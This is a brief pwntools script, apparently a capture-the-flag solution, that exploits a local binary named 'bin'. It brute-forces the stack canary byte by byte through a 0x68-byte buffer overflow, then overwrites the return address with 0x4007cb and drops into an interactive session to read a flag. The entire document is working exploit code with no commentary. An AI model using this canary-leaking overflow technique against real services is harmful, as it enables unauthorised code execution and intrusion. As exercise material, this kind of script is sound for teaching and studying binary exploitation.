#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./bin')
elf = ELF("./bin")

p.recvuntil('Please pwn me :)\n')
canary = '\x00'
for j in range(7):
    for i in range(0x100):
        p.send('A'*0x68 + canary + chr(i))
        a = p.recvuntil('Please pwn me :)\n')
        if 'recv' in a:
            canary += chr(i)
            break

payload = 'A'*0x68 + canary + p64(0xdeadbeef) + p64(0x4007cb)
p.send(payload)
p.interactive()
#p.sendline("cat flag")
#flag = p.recv()
#p.close()
#log.success('key is: ' + flag)